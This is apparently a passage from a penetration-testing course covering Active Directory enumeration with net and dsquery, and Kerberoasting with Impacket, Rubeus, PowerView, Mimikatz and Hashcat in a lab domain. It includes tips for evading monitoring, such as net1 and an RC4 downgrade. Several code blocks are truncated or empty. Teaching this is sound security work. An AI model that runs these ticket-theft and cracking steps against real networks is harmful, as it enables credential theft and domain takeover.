[Net](https://docs.microsoft.com/en-us/windows/win32/winsock/net-exe-2) commands can be beneficial to us when attempting to enumerate information from the domain. These commands can be used to query the local host and remote hosts, much like the capabilities provided by WMI. We can list information such as:

- Local and domain users
- Groups
- Hosts
- Specific users in groups
- Domain Controllers
- Password requirements

We'll cover a few examples below. Keep in mind that `net.exe` commands are typically monitored by EDR solutions and can quickly give up our location if our assessment has an evasive component. Some organizations will even configure their monitoring tools to throw alerts if certain commands are run by users in specific OUs, such as a Marketing Associate's account running commands such as `whoami`, and `net localgroup administrators`, etc. This could be an obvious red flag to anyone monitoring the network heavily.

#### Table of Useful Net Commands

| **Command** | **Description** |
| --- | --- |
| `net accounts` | Information about password requirements |
| `net accounts /domain` | Password and lockout policy |
| `net group /domain` | Information about domain groups |
| `net group "Domain Admins" /domain` | List users with domain admin privileges |
| `net group "domain computers" /domain` | List of PCs connected to the domain |
| `net group "Domain Controllers" /domain` | List PC accounts of domains controllers |
| `net group <domain_group_name> /domain` | User that belongs to the group |
| `net groups /domain` | List of domain groups |
| `net localgroup` | All available groups |
| `net localgroup administrators /domain` | List users that belong to the administrators group inside the domain (the group `Domain Admins` is included here by default) |
| `net localgroup Administrators` | Information about a group (admins) |
| `net localgroup administrators [username] /add` | Add user to administrators |
| `net share` | Check current shares |
| `net user <ACCOUNT_NAME> /domain` | Get information about a user within the domain |
| `net user /domain` | List all users of the domain |
| `net user %username%` | Information about the current user |
| `net use x: \computer\share` | Mount the share locally |
| `net view` | Get a list of computers |
| `net view /all /domain[:domainname]` | Shares on the domains |
| `net view \computer /ALL` | List shares of a computer |
| `net view /domain ` | List of PCs of the domain |

#### Listing Domain Groups

```powershell
PS C:\htb> net group /domain

The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.

Group Accounts for \\ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL
-------------------------------------------------------------------------------

```

We can see above the `net group` command provided us with a list of groups within the domain.

#### Information about a Domain User

```powershell
PS C:\htb> net user /domain wrouse

The request will be processed at a domain controller for domain INLANEFREIGHT.LOCAL.

#### Net Commands Trick

If you believe the network defenders are actively logging/looking for any commands out of the normal, you can try this workaround to using net commands. Typing `net1` instead of `net` will execute the same functions without the potential trigger from the net string.

## Dsquery

[Dsquery](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc732952(v=ws.11)) is a helpful command-line tool that can be utilized to find Active Directory objects. The queries we run with this tool can be easily replicated with tools like BloodHound and PowerView, but we may not always have those tools at our disposal, as discussed at the beginning of the section. But, it is a likely tool that domain sysadmins are utilizing in their environment. With that in mind, `dsquery` will exist on any host with the `Active Directory Domain Services Role` installed, and the `dsquery` DLL exists on all modern Windows systems by default now and can be found at `C:\Windows\System32\dsquery.dll`.

#### Dsquery DLL

All we need is elevated privileges on a host or the ability to run an instance of Command Prompt or PowerShell from a `SYSTEM` context. Below, we will show the basic search function with `dsquery` and a few helpful search filters.

#### User Search

We can use a [dsquery wildcard search](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc754232(v=ws.11)) to view all objects in an OU, for example.

We can, of course, combine `dsquery` with LDAP search filters of our choosing. The below looks for users with the `PASSWD_NOTREQD` flag set in the `userAccountControl` attribute.

#### Users With Specific Attributes Set (PASSWD\_NOTREQD)

```powershell
PS C:\htb> dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=32))" -attr distinguishedName userAccountControl

  distinguishedName                                                                              userAccountControl
  CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL                                                    66082

```

The below search filter looks for all Domain Controllers in the current domain, limiting to five results.

#### Searching for Domain Controllers

```powershell
PS C:\Users\forend.INLANEFREIGHT> dsquery * -filter "(userAccountControl:1.2.840.113556.1.4.803:=8192)" -limit 5 -attr sAMAccountName

 sAMAccountName
 ACADEMY-EA-DC01$

```

### LDAP Filtering Explained

You will notice in the queries above that we are using strings such as `userAccountControl:1.2.840.113556.1.4.803:=8192`. These strings are common LDAP queries that can be used with several different tools too, including AD PowerShell, ldapsearch, and many others. Let's break them down quickly:

`userAccountControl:1.2.840.113556.1.4.803:` Specifies that we are looking at the [User Account Control (UAC) attributes](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties) for an object. This portion can change to include three different values we will explain below when searching for information in AD (also known as [Object Identifiers (OIDs)](https://ldap.com/ldap-oid-reference-guide/).

`=8192` represents the decimal bitmask we want to match in this search. This decimal number corresponds to a corresponding UAC Attribute flag that determines if an attribute like `password is not required` or `account is locked` is set. These values can compound and make multiple different bit entries. Below is a quick list of potential values.

#### UAC Values

![text](https://academy.hackthebox.com/storage/modules/143/UAC-values.png)

#### OID match strings

OIDs are rules used to match bit values with attributes, as seen above. For LDAP and AD, there are three main matching rules:

1. `1.2.840.113556.1.4.803`

When using this rule as we did in the example above, we are saying the bit value must match completely to meet the search requirements. Great for matching a singular attribute.

1. `1.2.840.113556.1.4.804`

When using this rule, we are saying that we want our results to show any attribute match if any bit in the chain matches. This works in the case of an object having multiple attributes set.

1. `1.2.840.113556.1.4.1941`

This rule is used to match filters that apply to the Distinguished Name of an object and will search through all ownership and membership entries.

#### Logical Operators

When building out search strings, we can utilize logical operators to combine values for the search.
The operators `&` `|` and `!` are used for this purpose. For example we can combine multiple [search criteria](https://learn.microsoft.com/en-us/windows/win32/adsi/search-filter-syntax) with the `& (and)` operator like so:

`(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=64))`

The above example sets the first criteria that the object must be a user and combines it with searching for a UAC bit value of 64 (Password Can't Change). A user with that attribute set would match the filter. You can take this even further and combine multiple attributes like `(&(1) (2) (3))`. The `!` (not) and `|` (or) operators can work similarly. For example, our filter above can be modified as follows:

`(&(objectClass=user)(!userAccountControl:1.2.840.113556.1.4.803:=64))`

This would search for any user object that does `NOT` have the Password Can't Change attribute set. When thinking about users, groups, and other objects in AD, our ability to search with LDAP queries is pretty extensive.

A lot can be done with UAC filters, operators, and attribute matching with OID rules. For now, this general explanation should be sufficient to cover this module. For more information and a deeper dive into using this type of filter searching, see the [Active Directory LDAP](https://academy.hackthebox.com/course/preview/active-directory-ldap) module.

We have now used our foothold to perform credentialed enumeration with tools on Linux and Windows attack hosts and using built-in tools and validated host and domain information. We have proven that we can access internal hosts, password spraying, and LLMNR/NBT-NS poisoning works and that we can utilize tools that already reside on the hosts to perform our actions. Now we will take it a step further and tackle a TTP every AD pentester should have in their toolbelt, `Kerberoasting`.


# Kerberoasting - from Linux

* * *

Our enumeration up to this point has given us a broad picture of the domain and potential issues. We have enumerated user accounts and can see that some are configured with Service Principal Names. Let's see how we can leverage this to move laterally and escalate privileges in the target domain.

* * *

## Kerberoasting Overview

Kerberoasting is a lateral movement/privilege escalation technique in Active Directory environments. This attack targets [Service Principal Names (SPN)](https://docs.microsoft.com/en-us/windows/win32/ad/service-principal-names) accounts. SPNs are unique identifiers that Kerberos uses to map a service instance to a service account in whose context the service is running. Domain accounts are often used to run services to overcome the network authentication limitations of built-in accounts such as `NT AUTHORITY\LOCAL SERVICE`. Any domain user can request a Kerberos ticket for any service account in the same domain. This is also possible across forest trusts if authentication is permitted across the trust boundary. All you need to perform a Kerberoasting attack is an account's cleartext password (or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host.

Domain accounts running services are often local administrators, if not highly privileged domain accounts. Due to the distributed nature of systems, interacting services, and associated data transfers, service accounts may be granted administrator privileges on multiple servers across the enterprise. Many services require elevated privileges on various systems, so service accounts are often added to privileged groups, such as Domain Admins, either directly or via nested membership. Finding SPNs associated with highly privileged accounts in a Windows environment is very common. Retrieving a Kerberos ticket for an account with an SPN does not by itself allow you to execute commands in the context of this account. However, the ticket (TGS-REP) is encrypted with the service account’s NTLM hash, so the cleartext password can potentially be obtained by subjecting it to an offline brute-force attack with a tool such as Hashcat.

Service accounts are often configured with weak or reused password to simplify administration, and sometimes the password is the same as the username. If the password for a domain SQL Server service account is cracked, you are likely to find yourself as a local admin on multiple servers, if not Domain Admin. Even if cracking a ticket obtained via a Kerberoasting attack gives a low-privilege user account, we can use it to craft service tickets for the service specified in the SPN. For example, if the SPN is set to MSSQL/SRV01, we can access the MSSQL service as sysadmin, enable the xp\_cmdshell extended procedure and gain code execution on the target SQL server.

For an interesting look at the origin of this technique, check out the [talk](https://youtu.be/PUyhlN-E5MU) Tim Medin gave at Derbycon 2014, showcasing Kerberoasting to the world.

* * *

## Kerberoasting - Performing the Attack

Depending on your position in a network, this attack can be performed in multiple ways:

- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525(v=ws.11)) /netonly.

Several tools can be utilized to perform the attack:

- Impacket’s [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from a non-domain joined Linux host.
- A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
- From Windows, utilizing tools such as PowerView, [Rubeus](https://github.com/GhostPack/Rubeus), and other PowerShell scripts.

Obtaining a TGS ticket via Kerberoasting does not guarantee you a set of valid credentials, and the ticket must still be `cracked` offline with a tool such as Hashcat to obtain the cleartext password. TGS tickets take longer to crack than other formats such as NTLM hashes, so often, unless a weak password is set, it can be difficult or impossible to obtain the cleartext using a standard cracking rig.

* * *

## Efficacy of the Attack

While it can be a great way to move laterally or escalate privileges in a domain, Kerberoasting and the presence of SPNs do not guarantee us any level of access. We might be in an environment where we crack a TGS ticket and obtain Domain Admin access straightway or obtain credentials that help us move down the path to domain compromise. Other times we may perform the attack and retrieve many TGS tickets, some of which we can crack, but none of the ones that crack are for privileged users, and the attack does not gain us any additional access. I would likely write up the finding as high-risk in my report in the first two cases. In the third case, we may Kerberoast and end up unable to crack a single TGS ticket, even after days of cracking attempts with Hashcat on a powerful GPU password cracking rig. In this scenario, I would still write up the finding, but I would drop it down to a medium-risk issue to make the client aware of the risk of SPNs in the domain (these strong passwords could always be changed to something weaker or a very determined attacker may be able to crack the tickets using Hashcat), but take into account the fact that I was unable to take control of any domain accounts using the attack. It is vital to make these types of distinctions in our reports and know when it's ok to lower the risk of a finding when mitigating controls (such as very strong passwords) are in place.

* * *

## Performing the Attack

Kerberoasting attacks are easily done now using automated tools and scripts. We will cover performing this attack in various ways, both from a Linux and a Windows attack host. Let's first go through how to do this from a Linux host. The following section will walk through a "semi-manual" way of performing the attack and two quick, automated attacks using common open-source tools, all from a Windows attack host.

* * *

## Kerberoasting with GetUserSPNs.py

A prerequisite to performing Kerberoasting attacks is either domain user credentials (cleartext or just an NTLM hash if using Impacket), a shell in the context of a domain user, or account such as SYSTEM. Once we have this level of access, we can start. We must also know which host in the domain is a Domain Controller so we can query it.

Let's start by installing the Impacket toolkit, which we can grab from [Here](https://github.com/SecureAuthCorp/impacket). After cloning the repository, we can cd into the directory and install it as follows:

#### Installing Impacket using Pip

```shell
sudo python3 -m pip install .

Processing /opt/impacket
  Preparing metadata (setup.py) ... done
Requirement already satisfied: chardet in /usr/lib/python3/dist-packages (from impacket==0.9.25.dev1+20220208.122405.769c3196) (4.0.0)

Requirement already satisfied: future in /usr/lib/python3/dist-packages (from impacket==0.9.25.dev1+20220208.122405.769c3196) (0.18.2)
Requirement already satisfied: ldap3!=2.5.0,!=2.5.2,!=2.6,>=2.5 in /usr/lib/python3/dist-packages (from impacket==0.9.25.dev1+20220208.122405.769c3196) (2.8.1)

<SNIP>

```

This will install all Impacket tools and place them in our PATH so we can call them from any directory on our attack host. Impacket is already installed on the attack host that we can spawn at the end of this section to follow along and work through the exercises. Running the tool with the `-h` flag will bring up the help menu.

#### Listing GetUserSPNs.py Help Options

```shell
GetUserSPNs.py -h

Impacket v0.9.25.dev1+20220208.122405.769c3196 - Copyright 2021 SecureAuth Corporation

Queries target domain for SPNs that are running under a user account

positional arguments:
  target                domain/username[:password]

<SNIP>

```

We can start by just gathering a listing of SPNs in the domain. To do this, we will need a set of valid domain credentials and the IP address of a Domain Controller. We can authenticate to the Domain Controller with a cleartext password, NT password hash, or even a Kerberos ticket. For our purposes, we will use a password. Entering the below command will generate a credential prompt and then a nicely formatted listing of all SPN accounts. From the output below, we can see that several accounts are members of the Domain Admins group. If we can retrieve and crack one of these tickets, it could lead to domain compromise. It is always worth investigating the group membership of all accounts because we may find an account with an easy-to-crack ticket that can help us further our goal of moving laterally/vertically in the target domain.

With this ticket in hand, we could attempt to crack the user's password offline using Hashcat. If we are successful, we may end up with Domain Admin rights.

To facilitate offline cracking, it is always good to use the `-outputfile` flag to write the TGS tickets to a file that can then be run using Hashcat on our attack system or moved to a GPU cracking rig.

#### Saving the TGS Ticket to an Output File

```shell

We've successfully cracked the user's password as `database!`. As the last step, we can confirm our access and see that we indeed have Domain Admin rights as we can authenticate to the target DC in the INLANEFREIGHT.LOCAL domain. From here, we could perform post-exploitation and continue to enumerate the domain for other paths to compromise and other notable flaws and misconfigurations.

#### Testing Authentication against a Domain Controller

```shell
sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!

SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)

## More Roasting

Now that we've covered Kerberoasting from a Linux attack host, we'll go through the process from a Windows host. We may decide to perform part, or all, of our testing from a Windows host, our client may provide us with a Windows host to test from, or we may compromise a host and need to use it as a jump-off point for further attacks. Regardless of how we are using Windows hosts during our assessments, to remain versatile, it is essential to understand how to perform as many attacks as possible from both Linux and Windows hosts, because we never know what we will have thrown at us from one assessment to another.


# Kerberoasting - from Windows

* * *

## Kerberoasting - Semi Manual method

Before tools such as `Rubeus` existed, stealing or forging Kerberos tickets was a complex, manual process. As the tactic and defenses have evolved, we can now perform Kerberoasting from Windows in multiple ways. To start down this path, we will explore the manual route and then move into more automated tooling. Let's begin with the built-in [setspn](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc731241(v=ws.11)) binary to enumerate SPNs in the domain.

#### Enumerating SPNs with setspn.exe

```cmd-session

Existing SPN found!

```

We will notice many different SPNs returned for the various hosts in the domain. We will focus on `user accounts` and ignore the computer accounts returned by the tool. Next, using PowerShell, we can request TGS tickets for an account in the shell above and load them into memory. Once they are loaded into memory, we can extract them using `Mimikatz`. Let's try this by targeting a single user:

#### Targeting a Single User

```powershell
PS C:\htb> Add-Type -AssemblyName System.IdentityModel
PS C:\htb> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"

Id                   : uuid-67a2100c-150f-477c-a28a-19f6cfed4e90-2
SecurityKeys         : {System.IdentityModel.Tokens.InMemorySymmetricSecurityKey}
ValidFrom            : 2/24/2022 11:36:22 PM
ValidTo              : 2/25/2022 8:55:25 AM
ServicePrincipalName : MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433
SecurityKey          : System.IdentityModel.Tokens.InMemorySymmetricSecurityKey

```

Before moving on, let's break down the commands above to see what we are doing (which is essentially what is used by [Rubeus](https://posts.specterops.io/kerberoasting-revisited-d434351bd4d1) when using the default Kerberoasting method):

- The [Add-Type](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/add-type?view=powershell-7.2) cmdlet is used to add a .NET framework class to our PowerShell session, which can then be instantiated like any .NET framework object
- The `-AssemblyName` parameter allows us to specify an assembly that contains types that we are interested in using
- [System.IdentityModel](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel?view=netframework-4.8) is a namespace that contains different classes for building security token services
- We'll then use the [New-Object](https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.utility/new-object?view=powershell-7.2) cmdlet to create an instance of a .NET Framework object
- We'll use the [System.IdentityModel.Tokens](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens?view=netframework-4.8) namespace with the [KerberosRequestorSecurityToken](https://docs.microsoft.com/en-us/dotnet/api/system.identitymodel.tokens.kerberosrequestorsecuritytoken?view=netframework-4.8) class to create a security token and pass the SPN name to the class to request a Kerberos TGS ticket for the target account in our current logon session

We can also choose to retrieve all tickets using the same method, but this will also pull all computer accounts, so it is not optimal.

#### Retrieving All Tickets Using setspn.exe

```powershell
PS C:\htb> setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }

```

The above command combines the previous command with `setspn.exe` to request tickets for all accounts with SPNs set.

Now that the tickets are loaded, we can use `Mimikatz` to extract the ticket(s) from `memory`.

## Extracting Tickets from Memory with Mimikatz

```cmd-session

If we do not specify the `base64 /out:true` command, Mimikatz will extract the tickets and write them to `.kirbi` files. Depending on our position on the network and if we can easily move files to our attack host, this can be easier when we go to crack the tickets. Let's take the base64 blob retrieved above and prepare it for cracking.

Next, we can take the base64 blob and remove new lines and white spaces since the output is column wrapped, and we need it all on one line for the next step.

#### Preparing the Base64 Blob for Cracking

```shell
echo "<base64 blob>" |  tr -d \\n

```

We can place the above single line of output into a file and convert it back to a `.kirbi` file using the `base64` utility.

#### Placing the Output into a File as .kirbi

```shell
cat encoded_file | base64 -d > sqldev.kirbi

```

Next, we can use [this](https://raw.githubusercontent.com/nidem/kerberoast/907bf234745fe907cf85f3fd916d1c14ab9d65c0/kirbi2john.py) version of the `kirbi2john.py` tool to extract the Kerberos ticket from the TGS file.

#### Extracting the Kerberos Ticket using kirbi2john.py

```shell
python2.7 kirbi2john.py sqldev.kirbi

```

This will create a file called `crack_file`. We then must modify the file a bit to be able to use Hashcat against the hash.

#### Modifiying crack\_file for Hashcat

```shell
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat

```

Now we can check and confirm that we have a hash that can be fed to Hashcat.

#### Viewing the Prepared Hash

```shell
cat sqldev_tgs_hashcat

```

We can then run the ticket through Hashcat again and get the cleartext password `database!`.

If we decide to skip the base64 output with Mimikatz and type `mimikatz # kerberos::list /export`, the .kirbi file (or files) will be written to disk. In this case, we can download the file(s) and run `kirbi2john.py` against them directly, skipping the base64 decoding step.

Now that we have seen the older, more manual way to perform Kerberoasting from a Windows machine and offline processing, let's look at some quicker ways. Most assessments are time-boxed, and we often need to work as quickly and efficiently as possible, so the above method will likely not be our go-to every time. That being said, it can be useful for us to have other tricks up our sleeves and methodologies in case our automated tools fail or are blocked.

## Automated / Tool Based Route

Next, we'll cover two much quicker ways to perform Kerberoasting from a Windows host. First, let's use [PowerView](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1) to extract the TGS tickets and convert them to Hashcat format. We can start by enumerating SPN accounts.

#### Using PowerView to Extract TGS Tickets

```powershell
PS C:\htb> Import-Module .\PowerView.ps1
PS C:\htb> Get-DomainUser * -spn | select samaccountname

samaccountname
--------------
adfs
backupagent
krbtgt
sqldev
sqlprod
sqlqa
solarwindsmonitor

```

From here, we could target a specific user and retrieve the TGS ticket in Hashcat format.

#### Using PowerView to Target a Specific User

```powershell
PS C:\htb> Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat

SamAccountName       : sqldev
DistinguishedName    : CN=sqldev,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL

```

Finally, we can export all tickets to a CSV file for offline processing.

#### Exporting All Tickets to a CSV File

```powershell
PS C:\htb> Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation

```

#### Viewing the Contents of the .CSV File

```powershell

<SNIP>

```

We can also use [Rubeus](https://github.com/GhostPack/Rubeus) from GhostPack to perform Kerberoasting even faster and easier. Rubeus provides us with a variety of options for performing Kerberoasting.

#### Using Rubeus

```powershell
PS C:\htb> .\Rubeus.exe

<SNIP>

Roasting:

    Perform Kerberoasting:
        Rubeus.exe kerberoast [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]

    Perform Kerberoasting, outputting hashes to a file:
        Rubeus.exe kerberoast /outfile:hashes.txt [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps]

    Perform Kerberoasting, outputting hashes in the file output format, but to the console:
        Rubeus.exe kerberoast /simple [[/spn:"blah/blah"] | [/spns:C:\temp\spns.txt]] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]

    Perform Kerberoasting with alternate credentials:
        Rubeus.exe kerberoast /creduser:DOMAIN.FQDN\USER /credpassword:PASSWORD [/spn:"blah/blah"] [/user:USER] [/domain:DOMAIN] [/dc:DOMAIN_CONTROLLER] [/ou:"OU=,..."] [/ldaps] [/nowrap]

    Perform Kerberoasting with an existing TGT:
        Rubeus.exe kerberoast </spn:"blah/blah" | /spns:C:\temp\spns.txt> </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]

    Perform Kerberoasting with an existing TGT using an enterprise principal:
        Rubeus.exe kerberoast </spn:[email protected] | /spns:[email protected],[email protected]> /enterprise </ticket:BASE64 | /ticket:FILE.KIRBI> [/nowrap]

    Perform Kerberoasting with an existing TGT and automatically retry with the enterprise principal if any fail:
        Rubeus.exe kerberoast </ticket:BASE64 | /ticket:FILE.KIRBI> /autoenterprise [/ldaps] [/nowrap]

    Perform Kerberoasting using the tgtdeleg ticket to request service tickets - requests RC4 for AES accounts:
        Rubeus.exe kerberoast /usetgtdeleg [/ldaps] [/nowrap]

    Perform "opsec" Kerberoasting, using tgtdeleg, and filtering out AES-enabled accounts:
        Rubeus.exe kerberoast /rc4opsec [/ldaps] [/nowrap]

    List statistics about found Kerberoastable accounts without actually sending ticket requests:
        Rubeus.exe kerberoast /stats [/ldaps] [/nowrap]

    Perform Kerberoasting, requesting tickets only for accounts with an admin count of 1 (custom LDAP filter):
        Rubeus.exe kerberoast /ldapfilter:'admincount=1' [/ldaps] [/nowrap]

    Perform Kerberoasting, requesting tickets only for accounts whose password was last set between 01-31-2005 and 03-29-2010, returning up to 5 service tickets:
        Rubeus.exe kerberoast /pwdsetafter:01-31-2005 /pwdsetbefore:03-29-2010 /resultlimit:5 [/ldaps] [/nowrap]

    Perform Kerberoasting, with a delay of 5000 milliseconds and a jitter of 30%:
        Rubeus.exe kerberoast /delay:5000 /jitter:30 [/ldaps] [/nowrap]

    Perform AES Kerberoasting:
        Rubeus.exe kerberoast /aes [/ldaps] [/nowrap]

```

As we can see from scrolling the Rubeus help menu, the tool has a vast number of options for interacting with Kerberos, most of which are out of the scope of this module and will be covered in-depth in later modules on advanced Kerberos attacks. It is worth scrolling through the menu, familiarizing yourself with the options, and reading up on the various other possible tasks. Some options include:

- Performing Kerberoasting and outputting hashes to a file
- Using alternate credentials
- Performing Kerberoasting combined with a pass-the-ticket attack
- Performing "opsec" Kerberoasting to filter out AES-enabled accounts
- Requesting tickets for accounts passwords set between a specific date range
- Placing a limit on the number of tickets requested
- Performing AES Kerberoasting

#### Viewing Rubeus's Capabilities

![image](https://academy.hackthebox.com/storage/modules/143/rubeus_help.png)

We can first use Rubeus to gather some stats. From the output below, we can see that there are nine Kerberoastable users, seven of which support RC4 encryption for ticket requests and two of which support AES 128/256. More on encryption types later. We also see that all nine accounts had their password set this year (2022 at the time of writing). If we saw any SPN accounts with their passwords set 5 or more years ago, they could be promising targets as they could have a weak password that was set and never changed when the organization was less mature.

#### Using the /stats Flag

Let's use Rubeus to request tickets for accounts with the `admincount` attribute set to `1`. These would likely be high-value targets and worth our initial focus for offline cracking efforts with Hashcat. Be sure to specify the `/nowrap` flag so that the hash can be more easily copied down for offline cracking using Hashcat. Per the documentation, the ""/nowrap" flag prevents any base64 ticket blobs from being column wrapped for any function"; therefore, we won't have to worry about trimming white space or newlines before cracking with Hashcat.

#### Using the /nowrap Flag

```powershell
PS C:\htb> .\Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap

## A Note on Encryption Types

The below examples on encryption types are not reproducible in the module lab because the target Domain Controller is running Windows Server 2019. More on that later in the section.

Kerberoasting tools typically request `RC4 encryption` when performing the attack and initiating TGS-REQ requests. This is because RC4 is [weaker](https://www.stigviewer.com/stig/windows_10/2017-04-28/finding/V-63795) and easier to crack offline using tools such as Hashcat than other encryption algorithms such as AES-128 and AES-256. When performing Kerberoasting in most environments, we will retrieve hashes that begin with `$krb5tgs$23$*`, an RC4 (type 23) encrypted ticket. Sometimes we will receive an AES-256 (type 18) encrypted hash or hash that begins with `$krb5tgs$18$*`. While it is possible to crack AES-128 (type 17) and AES-256 (type 18) TGS tickets using [Hashcat](https://github.com/hashcat/hashcat/pull/1955), it will typically be significantly more time consuming than cracking an RC4 (type 23) encrypted ticket, but still possible especially if a weak password is chosen. Let's walk through an example.

Let's start by creating an SPN account named `testspn` and using Rubeus to Kerberoast this specific user to test this out. As we can see, we received the TGS ticket RC4 (type 23) encrypted.

```

Checking with PowerView, we can see that the `msDS-SupportedEncryptionTypes` attribute is set to `0`. The chart [here](https://techcommunity.microsoft.com/t5/core-infrastructure-and-security/decrypting-the-selection-of-supported-kerberos-encryption-types/ba-p/1628797) tells us that a decimal value of `0` means that a specific encryption type is not defined and set to the default of `RC4_HMAC_MD5`.

```powershell
PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

serviceprincipalname                   msds-supportedencryptiontypes samaccountname

testspn/kerberoast.inlanefreight.local                            0 testspn

```

Next, let's crack this ticket using Hashcat and note how long it took. The account is set with a weak password found in the `rockyou.txt` wordlist for our purposes. Running this through Hashcat, we see that it took four seconds to crack on a CPU, and therefore it would crack almost instantly on a powerful GPU cracking rig and probably even on a single GPU.

#### Cracking the Ticket with Hashcat & rockyou.txt

Let's assume that our client has set SPN accounts to support AES 128/256 encryption.

![image](https://academy.hackthebox.com/storage/modules/143/aes_kerberoast.png)

If we check this with PowerView, we'll see that the `msDS-SupportedEncryptionTypes attribute` is set to `24`, meaning that AES 128/256 encryption types are the only ones supported.

#### Checking Supported Encryption Types

```powershell
PS C:\htb> Get-DomainUser testspn -Properties samaccountname,serviceprincipalname,msds-supportedencryptiontypes

serviceprincipalname                   msds-supportedencryptiontypes samaccountname
--------------------                   ----------------------------- --------------
testspn/kerberoast.inlanefreight.local                            24 testspn

```

Requesting a new ticket with Rubeus will show us that the account name is using AES-256 (type 18) encryption.

```

To run this through Hashcat, we need to use hash mode `19700`, which is `Kerberos 5, etype 18, TGS-REP (AES256-CTS-HMAC-SHA1-96)` per the handy Hashcat [example\_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) table. We run the AES hash as follows and check the status, which shows it should take over 23 minutes to run through the entire rockyou.txt wordlist by typing `s` to see the status of the cracking job.

We can use Rubeus with the `/tgtdeleg` flag to specify that we want only RC4 encryption when requesting a new service ticket. The tool does this by specifying RC4 encryption as the only algorithm we support in the body of the TGS request. This may be a failsafe built-in to Active Directory for backward compatibility. By using this flag, we can request an RC4 (type 23) encrypted ticket that can be cracked much faster.

#### Using the /tgtdeleg Flag

![image](https://academy.hackthebox.com/storage/modules/143/kerb_tgs_18.png)

In the above image, we can see that when supplying the `/tgtdeleg` flag, the tool requested an RC4 ticket even though the supported encryption types are listed as AES 128/256. This simple example shows the importance of detailed enumeration and digging deeper when performing attacks such as Kerberoasting. Here we could downgrade from AES to RC4 and cut cracking time down by over 4 minutes and 30 seconds. In a real-world engagement where we have a strong GPU password cracking rig at our disposal, this type of downgrade could result in a hash cracking in a few hours instead of a few days and could make and break our assessment.

Note: This does not work against a Windows Server 2019 Domain Controller, regardless of the domain functional level. It will always return a service ticket encrypted with the highest level of encryption supported by the target account. This being said, if we find ourselves in a domain with Domain Controllers running on Server 2016 or earlier (which is quite common), enabling AES will not partially mitigate Kerberoasting by only returning AES encrypted tickets, which are much more difficult to crack, but rather will allow an attacker to request an RC4 encrypted service ticket. In Windows Server 2019 DCs, enabling AES encryption on an SPN account will result in us receiving an AES-256 (type 18) service ticket, which is substantially more difficult (but not impossible) to crack, especially if a relatively weak dictionary password is in use.

It is possible to edit the encryption types used by Kerberos. This can be done by opening Group Policy, editing the Default Domain Policy, and choosing: `Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options`, then double-clicking on `Network security: Configure encryption types allowed for Kerberos` and selecting the desired encryption type allowed for Kerberos. Removing all other encryption types except for `RC4_HMAC_MD5` would allow for the above downgrade example to occur in 2019. Removing support for AES would introduce a security flaw into AD and should likely never be done. Furthermore, removing support for RC4 regardless of the Domain Controller Windows Server version or domain functional level could have operational impacts and should be thoroughly tested before implementation.

## Mitigation & Detection

